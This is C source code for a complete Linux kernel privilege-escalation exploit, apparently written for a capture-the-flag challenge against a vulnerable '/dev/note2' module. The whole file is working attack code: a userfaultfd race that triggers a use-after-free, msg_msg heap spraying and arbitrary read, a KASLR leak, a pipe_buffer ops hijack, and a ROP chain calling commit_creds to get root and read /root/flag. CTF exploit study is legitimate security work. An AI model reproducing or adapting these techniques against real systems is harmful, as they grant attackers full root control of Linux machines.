#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <syscall.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <linux/userfaultfd.h>

#define PAGE_SIZE 4096ul
#define QW_COUNT (512 / sizeof(uint64_t))
#define TABLE_MAX 0x10

#define OPS_NOKASLR 0xffffffff81e3a940
int xplidx = 0;

/* Module helpers */
#define IOC_MAGIC '\xFF'

#define IO_ADD _IOWR(IOC_MAGIC, 0, struct ioctl_arg)
#define IO_EDIT _IOWR(IOC_MAGIC, 1, struct ioctl_arg)
#define IO_SHOW _IOWR(IOC_MAGIC, 2, struct ioctl_arg)
#define IO_DEL _IOWR(IOC_MAGIC, 3, struct ioctl_arg)

struct ioctl_arg
{
    uint64_t idx;
    uint64_t size;
    uint64_t addr;
};

int dev;

int open_dev(void)
{
    return open("/dev/note2", O_RDONLY);
}

int do_add(uint64_t size, void *data)
{
    struct ioctl_arg req = {
        .idx = 0,
        .size = size,
        .addr = (uint64_t)data};
    ioctl(dev, IO_ADD, &req);
}

int do_edit(uint64_t idx, void *data)
{
    struct ioctl_arg req = {
        .idx = idx,
        .size = 0,
        .addr = (uint64_t)data};
    ioctl(dev, IO_EDIT, &req);
}

int do_show(uint64_t idx, void *data)
{
    struct ioctl_arg req = {
        .idx = idx,
        .size = 0,
        .addr = (uint64_t)data};
    ioctl(dev, IO_SHOW, &req);
}

int do_del(uint64_t idx)
{
    struct ioctl_arg req = {
        .idx = idx,
        .size = 0,
        .addr = 0};
    ioctl(dev, IO_DEL, &req);
}

/* scheduler helpers */
void pin_on_cpu(unsigned cpu, pid_t pid)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(cpu, &cpu_set);
    if (sched_setaffinity(pid, sizeof(cpu_set), &cpu_set) != 0)
    {
        perror("[-]sched_setaffinity");
    }
}

/* msg_msg helpers */
#define SPRAY 256
#define MSG_COPY 040000
#define MTYPE_PRIMARY 0x41
#define MTYPE_SECONDARY 0x42
#define MTYPE_FAKE 0x43

typedef struct
{
    long mtype;
    char mtext[0];
} msg_t;

struct list_head
{
    uint64_t next, prev;
};

struct msg_msg
{
    struct list_head m_list;
    long m_type;
    size_t m_ts; /* message text size */
    uint64_t next;
    uint64_t security;
    uint8_t text[0];
};

int qid[SPRAY];

/* pipe_buffer helpers */
struct pipe_buffer
{
    uint64_t page;
    uint32_t offset;
    uint32_t len;
    uint64_t ops;
    uint32_t flags;
    uint32_t pad;
    uint64_t private;
};

struct pipe_buf_operations
{
    uint64_t confirm;
    uint64_t release;
    uint64_t steal;
    uint64_t get;
};

/* Userfaultfd helpers */
void *race_page;
int seqfd;

void uaf(void)
{
    // Do UAF
    do_del(xplidx);
    seqfd = open("/proc/self/stat", O_RDONLY); // consume node obj

    do_add(64, NULL); // dummy table entry
}

void *hang(void *arg)
{
    struct uffd_msg uf_msg;
    struct uffdio_copy uf_copy;
    struct uffdio_range uf_range;
    uint64_t uffd = (uint64_t)arg;
    struct pollfd pollfd;

    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    uf_range.start = (uint64_t)race_page;
    uf_range.len = 0x1000;

    uint8_t uf_buffer[0x1000] = {0};

    uf_copy.src = (uint64_t)uf_buffer;
    uf_copy.dst = (uint64_t)race_page;
    uf_copy.len = 0x1000;
    uf_copy.mode = 0;
    uf_copy.copy = 0;

    while (poll(&pollfd, 1, -1) > 0)
    {
        if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
        {
            perror("[-] poll");
        }

        // Reading the event
        if (read(uffd, &uf_msg, sizeof(uf_msg)) == 0)
        {
            perror("[-] read(uffd)");
        }
        if (uf_msg.event != UFFD_EVENT_PAGEFAULT)
        {
            perror("[-] uf_msg.event != UFFD_EVENT_PAGEFAULT");
        }

        puts("[+] Task hung");
        uaf();

        if (ioctl(uffd, UFFDIO_COPY, (uint64_t)&uf_copy) == -1)
        { //  Wake it up
            perror("[-] ioctl(UFFDIO_COPY)");
        }
        if (ioctl(uffd, UFFDIO_UNREGISTER, (uint64_t)&uf_range) == -1)
        {
            perror("[-] ioctl(UFFDIO_UNREGISTER)");
        }
        // if (munmap((void *)race_page, 0x1000) == -1)
        // {
        //     perror("[-] munmap(race_page)");
        // }
        return 0;
    }

    return 0;
}

void register_userfault(uint64_t race_page, pthread_t thread, void *(*func)(void *))
{
    int uffd, race;
    struct uffdio_api uf_api;
    struct uffdio_register uf_register;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    uf_api.api = UFFD_API;
    uf_api.features = 0;

    if (ioctl(uffd, UFFDIO_API, (uint64_t)&uf_api) == -1)
    {
        perror("[-] uffdio_api");
    }

    printf("[*] Registering userfaultfd for 0x%llx\n", race_page);

    // Page for userfaultfd
    if (mmap((void *)race_page, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0) != (void *)race_page)
    {
        perror("[-] mmap(race_page)");
    }

    uf_register.range.start = race_page;
    uf_register.range.len = 0x1000;
    uf_register.mode = UFFDIO_REGISTER_MODE_MISSING;

    if (ioctl(uffd, UFFDIO_REGISTER, (uint64_t)&uf_register) == -1)
    {
        perror("[-] ioctl(UFFDIO_REGISTER)");
    }

    race = pthread_create(&thread, NULL, func, (void *)(uint64_t)uffd);
    if (race != 0)
    {
        perror("[-] Race thread");
    }
    return;
}

/* Backup registers */
unsigned long bak_cs, bak_rflags, bak_ss, bak_rsp;

void bak()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov bak_cs, cs;"
        "mov bak_ss, ss;"
        "mov bak_rsp, rsp;"
        "pushf;"
        "pop bak_rflags;"
        ".att_syntax;");
    puts("[*] Registers backed up");
}

/* Exploit */
void win()
{
    char flag[1024] = {0};
    if (getuid() == 0)
    {
        puts("[+] Got root!");
        setreuid(0, 0);
        setregid(0, 0);

        int fd = open("/root/flag", O_RDONLY);
        if (fd < 0){
            perror("[-] open(flag)");
        }
        read(fd, flag, 1024);
        printf("[+] Flag: %s\n", flag);
    }
    else
    {
        puts("[-] Failed to get root...");
    }
}

void debug(void)
{
    puts("[*] Paused execution");
    getchar();
}

uint64_t mostfreq(uint64_t array[], int n)
{
    uint64_t result;
    int i, j, count;
    int freq = 0;

    for (i = 0; i < n; i++)
    {
        count = 1;
        for (j = i + 1; j < n; j++)
        {
            if (array[j] == array[i])
            {
                count++;
                if (count > freq)
                {
                    result = array[j];
                }
            }
        }
    }
    return result;
}

int isheap(uint64_t ptr)
{
    int high = ptr >> 44;
    if (high >= 0xffff8 && high < 0xfffff)
    {
        return 1;
    }
    return 0;
}

int exploit(void)
{

    bak();
    pin_on_cpu(0, 0);
    dev = open_dev();

    // Setup userfault for race
    pthread_t uaf = {0};
    race_page = (void *)0x1337000;
    register_userfault((uint64_t)race_page, uaf, hang);

    /*
    Make sure we overwrite key and size but not addr
    addr will be the one of the target cache populated by the new alloc
    */
    do_add(17, NULL); // Has to be 17 so we it goes in kmalloc-32

    // Defrag kmalloc-64
    msg_t *msg = calloc(1, sizeof(msg_t) + 64 - 48);
    for (int i = 0; i < SPRAY; i++)
    {
        qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (qid[i] < 0)
        {
            perror("[-] msgget");
        }
        memset(msg->mtext, i, 8);
        msg->mtype = MTYPE_PRIMARY;
        msgsnd(qid[i], msg, 64 - 48, 0);
        msg->mtype = MTYPE_SECONDARY;
        msgsnd(qid[i], msg, 1024 - 48, 0);
    }

    // Make holes in kmalloc-64
    for (int i = SPRAY / 2; i < SPRAY; i += 8)
    {
        if (msgrcv(qid[i], msg, 64 - 48, MTYPE_PRIMARY, 0) < 0)
        {
            perror("[-] msgrcv");
        }
        if (msgrcv(qid[i], msg, 1024 - 48, MTYPE_SECONDARY, 0) < 0)
        {
            perror("[-] msgrcv");
        }
        qid[i] = -1;
    }

    // Race condition (Trigger UAF)
    puts("[*] Starting race");
    do_edit(xplidx, race_page);
    puts("[*] Race ended");

    /*
    Leak size is 512 because is the biggest value allowed by the mask (0x1ff)
    so we don't need to allocate any more memory
    */
    uint64_t rawleak[QW_COUNT] = {0};
    uint64_t xorleak[QW_COUNT] = {0};
    int count = 0;
    do_show(xplidx, rawleak);
    for (int i = 0; i < QW_COUNT; i++)
    {
        if (rawleak[i] != 0)
        {
            xorleak[count++] = rawleak[i];
        }
    }

    /*
    Since mtext is all 0's for our msgs
    We should see a lot of repeated qwords, these are the XORed 0x0 qwords
    x ^ 0 = x, so the most frequent qword is the key
    */
    uint64_t leak[QW_COUNT] = {0};
    uint64_t key = mostfreq(xorleak, count);
    printf("[+] Key: 0x%lx\n", key);

    // Decypt leak
    for (int i = 0; i < QW_COUNT; i++)
    {
        if (rawleak[i])
        {
            leak[i] = rawleak[i] ^ key;
        }
        else
        {
            leak[i] = 0;
        }
    }

    /*
    Find msg_msg offset
    We don't need to worry about misaligned offsets because of the mask
    */
    uint64_t offset = -1;
    int pos = -1;
    for (int i = 0; i < QW_COUNT; i++)
    {
        if (isheap(leak[i]) && isheap(leak[i + 1]) &&
            leak[i + 2] == MTYPE_PRIMARY && leak[i + 3] == 64 - 48)
        {
            pos = i;
            offset = i * sizeof(uint64_t);
            break;
        }
    }
    if (offset == -1)
    {
        printf("[-] Couldn't find msg_msg\n");
        return -1;
    }

    // Kmalloc-1k leak
    uint64_t km1k = leak[pos];
    printf("[+] kmalloc-1k ptr @ %p\n", km1k);

    // Corrupt msg_msg
    printf("[*] msg_msg @ offset %i:\n", offset);
    int evil_qid;
    uint64_t data[QW_COUNT] = {0};
    uint64_t final[QW_COUNT] = {0};
    struct msg_msg *evilmsg = (void *)&data[pos];
    memcpy(data, leak, 512);
    printf("   m_list.next: %p\n"
           "   m_list.prev: %p\n"
           "   m_type: 0x%lx\n"
           "   next: %p\n"
           "   security: %p\n"
           "   data: \n"
           "       0x%lx 0x%lx\n",
           evilmsg->m_list.next, evilmsg->m_list.prev,
           evilmsg->m_type, evilmsg->next, evilmsg->security,
           ((uint64_t *)evilmsg->text)[0], ((uint64_t *)evilmsg->text)[1]);

    evil_qid = evilmsg->text[0];
    printf("[*] Corrupted qid: %i\n", evil_qid);

    // Arb Read w/ next msg_seg + MSG_COPY (Kmalloc-1k msg_msg)
    uint64_t *recv = calloc(2, PAGE_SIZE);
    evilmsg->next = evilmsg->m_list.next + 1024 - 16;
    evilmsg->m_ts = 4096 - 48 + 1024;

    for (int i = 0; i < QW_COUNT; i++)
    { // Encrypt payload
        final[i] = data[i] ^ key;
    }
    do_edit(xplidx, &final); // commit changes

    if (msgrcv(qid[evil_qid], recv, 4096 - 48 + 1024, 0, IPC_NOWAIT | MSG_COPY) < 0)
    {
        perror("[-] msgrcv");
        return -1;
    }

    struct msg_msg *victimmsg = (void *)&recv[(4096 - 48 + 16) / 8];
    if (!isheap(victimmsg->m_list.next) || !isheap(victimmsg->m_list.prev) || victimmsg->m_type != MTYPE_SECONDARY || victimmsg->m_ts != 1024 - 48)
    {
        puts("[-] Couldn't find next msg_msg");
        return -1;
    }

    puts("[*] next msg_msg in kmalloc-1k:");
    printf("   m_list.next: %p\n"
           "   m_list.prev: %p\n"
           "   m_type: 0x%lx\n"
           "   next: %p\n"
           "   security: %p\n"
           "   data: \n"
           "       0x%lx 0x%lx\n",
           victimmsg->m_list.next, victimmsg->m_list.prev,
           victimmsg->m_type, victimmsg->next, victimmsg->security,
           ((uint64_t *)victimmsg->text)[0], ((uint64_t *)victimmsg->text)[1]);

    int victim_qid = victimmsg->text[0];
    printf("[*] Next qid: %i\n", victim_qid);

    // Setup skbuf
    int sock[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock) < 0)
    {
        perror("[-] socketpair");
        return -1;
    }

    // Free msg_msg
    if (msgrcv(qid[victim_qid], recv, 1024 - 48, MTYPE_SECONDARY, 0) < 0)
    {
        close(sock[0]);
        close(sock[1]);
        perror("[-] msgrcv");
    }

    /*
    Now that the msg_msg from 1k was deleted and unlinked the m_list pointers were
    populated with junk values, so we can't simply double-free, insstead we allocate
    a skbuff and fill it we a dummy valid msg_msg
    */
    struct msg_msg *fakemsg = calloc(1, sizeof(struct msg_msg) + 1024 - 48);
    fakemsg->m_list.next = evilmsg->m_list.next + 1024;
    fakemsg->m_list.prev = evilmsg->m_list.next + 1024;
    fakemsg->m_type = MTYPE_FAKE;
    fakemsg->m_ts = 1024 - 48;

    for (int i = 0; i < 80; i++)
    {
        if (write(sock[0], fakemsg, 1024 - 320) < 0)
        {
            perror("[-] write(socket)");
            close(sock[0]);
            close(sock[1]);
            return -1;
        }
    }

    // Invalid-free skbuff
    evilmsg->m_list.next += 1024;
    evilmsg->m_ts = 64 - 48;
    evilmsg->next = 0;

    for (int i = 0; i < QW_COUNT; i++)
    { // Encrypt payload
        final[i] = data[i] ^ key;
    }
    do_edit(xplidx, &final); // commit changes

    if (msgrcv(qid[evil_qid], recv, 1024 - 48, MTYPE_FAKE, IPC_NOWAIT) < 0)
    {
        perror("[-] msgrcv");
        close(sock[0]);
        close(sock[1]);
        return -1;
    }

    // Spray pipe_buffer victims
    int pfd[SPRAY][2];
    for (int i = 0; i < SPRAY; i++)
    {
        pipe(pfd[i]);
    }

    // Populate pipe_buffer
    for (int i = 0; i < SPRAY; i++)
    {
        write(pfd[i][1], "pwn", 3);
    }

    /*
    Leak pipe_buffer
    Arb Read w/ next msg_seg + MSG_COPY (Kmalloc-1k msg_msg)
    */
    evilmsg->next = evilmsg->m_list.next - 16;
    evilmsg->m_ts = 4096 - 48 + 1024;

    for (int i = 0; i < QW_COUNT; i++)
    { // Encrypt payload
        final[i] = data[i] ^ key;
    }
    do_edit(xplidx, &final); // commit changes

    if (msgrcv(qid[evil_qid], recv, 4096 - 48 + 1024, 0, IPC_NOWAIT | MSG_COPY) < 0)
    {
        perror("[-] msgrcv");
        return -1;
    }

    // Prepare evil pipe
    uint64_t pipe_addr = evilmsg->m_list.next;
    struct pipe_buffer *evil_pipe = calloc(1, 1024 - 320);
    struct pipe_buffer *victim_pipe = (void *)&recv[(4096 - 48 + 16) / 8];
    struct pipe_buf_operations *fakeops = (void *)((uint64_t)evil_pipe + sizeof(struct pipe_buffer));

    memcpy(evil_pipe, victim_pipe, sizeof(struct pipe_buffer));
    evil_pipe->ops = pipe_addr + sizeof(struct pipe_buffer);

    // Got KASLR leak from pipe ops ptr
    uint64_t kaslr = victim_pipe->ops - OPS_NOKASLR;
    printf("[+] KASLR slide: 0x%lx\n", kaslr);

    // Hijack ops table + stack pivot
    uint64_t *stack_pivot = (void *)((uint64_t)evil_pipe + 0x66 + 1);
    uint64_t *start_rop = (void *)evil_pipe;
    fakeops->release = 0xffffffff81744c92 + kaslr; // push rsi; cmpsb byte ptr [rsi], byte ptr [rdi]; jmp qword ptr [rsi + 0x66];
    *stack_pivot = 0xffffffff8114c7bd + kaslr;     // pop rsp; ret;

    // Return to our rop chain (jump over ops table)
    *start_rop++ = 0xffffffff8114c7bd + kaslr; // pop rsp; ret;
    *start_rop = pipe_addr + 0x100;

    // ROP
    uint64_t pop_rdi_ptr = pipe_addr + 0x200;
    uint64_t *pop_rdi = (void *)((uint64_t)evil_pipe + 0x200);
    *pop_rdi = 0xffffffff81235e8d + kaslr;

    // prepare_kernel_cred(NULL);
    uint64_t *rop = (void *)((uint64_t)evil_pipe + 0x100);
    *rop++ = *pop_rdi; // pop rdi; ret;
    *rop++ = 0;
    *rop++ = 0xffffffff810b96c0 + kaslr; // prepare_kernel_cred

    // Mov ret val to arg0
    *rop++ = 0xffffffff81502cb3 + kaslr; // pop rcx; ret;
    *rop++ = pop_rdi_ptr;
    *rop++ = 0xffffffff81235e8d + kaslr; // pop rdi; ret; (will be popped into rcx)
    *rop++ = 0xffffffff816794a2 + kaslr; // xchg rax, rsi; ret 0xebff;
    *rop++ = 0xffffffff814bbaec + kaslr; // push rsi; jmp qword ptr [rcx];

    // commit_creds(&cred);
    *rop++ = 0xffffffff810b9480 + kaslr; // commit_creds

    // KPTI trampoline
    *rop++ = 0xffffffff81a00fc6 + kaslr; // swapgs_restore_regs_and_return_to_usermode+0x36
    *rop++ = 0;
    *rop++ = 0;
    *rop++ = (uint64_t)win;
    *rop++ = bak_cs;
    *rop++ = bak_rflags;
    *rop++ = bak_rsp;
    *rop++ = bak_ss;

    // Free skbuff (currently hangs on first read)
    for (int i = 0; i < 80; i++)
    {
        if (read(sock[1], recv, 1024 - 320) < 0)
        {
            perror("[-] read(socket)");
            close(sock[0]);
            close(sock[1]);
            return -1;
        }
    }

    // Overlap pipe_buffer with fake_ops + payload
    for (int i = 0; i < 80; i++)
    {
        if (write(sock[0], evil_pipe, 1024 - 320) < 0)
        {
            perror("[-] write(socket)");
            close(sock[0]);
            close(sock[1]);
            return -1;
        }
    }

    // Throw the pipe (Get control flow)
    for (int i = 0; i < SPRAY; i++)
    {
        close(pfd[i][0]);
        close(pfd[i][1]);
    }

    sleep(13371337);
    return 0;
}

int main(void)
{
    uint8_t junk[4096];

    // Try exploit at maximum once per table entry
    for (int i = 0; i < TABLE_MAX; i++)
    {
        xplidx = i;
        if (!fork())
        {
            puts("[*] Attempting exploit");
            if (!exploit())
            {
                exit(0);
            }
            puts("[-] Failed");

            // Clean up
            for (int i = 0; i < SPRAY; i++)
            {
                if (qid[i] != -1)
                {
                    msgrcv(qid[i], junk, 64 - 48, MTYPE_PRIMARY, 0);
                    msgrcv(qid[i], junk, 1024 - 48, MTYPE_SECONDARY, 0);
                }
            }

            close(seqfd);
            close(dev);
        }
        else
        {
            exit(0);
        }
    }
}